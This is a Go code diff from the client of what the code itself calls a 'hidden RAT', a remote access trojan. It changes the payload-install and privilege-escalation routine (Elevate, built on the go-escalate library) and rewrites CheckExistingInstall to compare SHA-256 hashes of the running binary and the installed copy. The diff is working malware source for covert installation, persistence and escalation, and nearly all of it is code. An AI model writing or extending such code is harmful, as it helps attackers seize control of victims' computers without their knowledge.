@@ -3,11 +3,11 @@
 package client
 
 import (
+	"crypto/sha256"
 	"errors"
 	"io/ioutil"
 	"log"
 	"os"
-	"path/filepath"
 
 	"github.com/lu4p/go-escalate"
 )
@@ -52,8 +52,7 @@ func installExecuteable() error {
 func Elevate() error {
 	log.Println("[Elevate] Installing payload into:", PathExe)
 
-	err := installExecuteable()
-	if err != nil {
+	if err := installExecuteable(); err != nil {
 		return errors.New("[Elevate] [!] Couldn't copy payload into target path")
 	}
 	log.Println("[Elevate] [+] Successfully copied payload into target path")
@@ -65,16 +64,35 @@ func Elevate() error {
 // currently running proccess. This is needed because duplicate payloads are required
 // during escalation and the installation of the hidden RAT
 func CheckExistingInstall() bool {
-	osexe, _ := os.Executable()
-	if osexe == PathExe {
-		_, err := os.Stat(filepath.Join(Path, "token"))
-		if err != nil {
-			log.Println("[CheckExisting] [!] Host key token is missing")
-			return false
-		}
+	osExe, _ := os.Executable()
+	if osExe == PathExe {
 		log.Println("[CheckExisting] I AM the existing install!")
 		return true
 	}
+
+	if _, err := os.Stat(PathExe); !os.IsNotExist(err) {
+		currExe, _ := os.ReadFile(osExe)
+		hash := sha256.New()
+		if _, err := hash.Write(currExe); err != nil {
+			return false
+		}
+
+		sumCurr := hash.Sum(nil)
+		hash.Reset()
+
+		installedExe, _ := os.ReadFile(PathExe)
+		if _, err := hash.Write(installedExe); err != nil {
+			return false
+		}
+
+		sumInstalled := hash.Sum(nil)
+
+		if string(sumCurr) == string(sumInstalled) {
+			log.Println("[CheckExisting] I am the same binary as the existing install!")
+			return true
+		}
+	}
+
 	log.Println("[CheckExisting] I am NOT the existing install!")
 	return false
 }
